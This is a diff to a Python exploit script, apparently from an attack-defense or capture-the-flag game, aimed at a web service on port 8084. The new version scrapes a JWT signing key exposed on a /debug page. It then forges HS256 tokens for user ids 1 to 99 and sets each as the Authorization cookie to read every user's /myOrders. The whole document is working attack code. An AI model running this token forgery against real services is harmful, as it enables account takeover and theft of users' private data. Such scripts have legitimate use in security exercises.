@@ -7,31 +7,30 @@ import sys
 import os
 import string
 import random
+import datetime
+import jwt
 
 ip = sys.argv[1]
-
 host = f"http://{ip}:8084"
 s = requests.Session()
 user_name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(15))
 password = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(15))
-r = s.post(
-  host + '/register',
-  data={
-    'user_name': password,
-    'password': user_name
-  })
+
 r = s.get(
-  host + '/users'
+  host + '/debug'
 )
-users = re.findall("\</p\>\<p style=\'margin: 4px 8px\'\>(.*?)\</p\>", r.text)
-for user in users:
-  r1 = s.post(
-    host + '/login',
-    data = {
-      'user_name': user,
-      'password': password
-    }
-  )
+private_key = re.findall("\<tr\>\<td class=\"e\"\>JWTKey \</td\>\<td class=\"v\"\>(.*?) \</td\>\</tr\>", r.text)[0]
+for id in range (1, 100):
+  payload0 = {
+      "sub": id,
+      "exp": int(datetime.datetime.now().timestamp()) + 600,
+  }
+  headers0 = {
+    "alg": "HS256",
+    "typ": "JWT"
+  }
+  encoded_jwt = (jwt.encode(payload=payload0, key=private_key, algorithm="HS256", headers=headers0)).decode()
+  s.cookies['Authorization'] = encoded_jwt
   r1 = s.get(
     host + "/myOrders"
   )
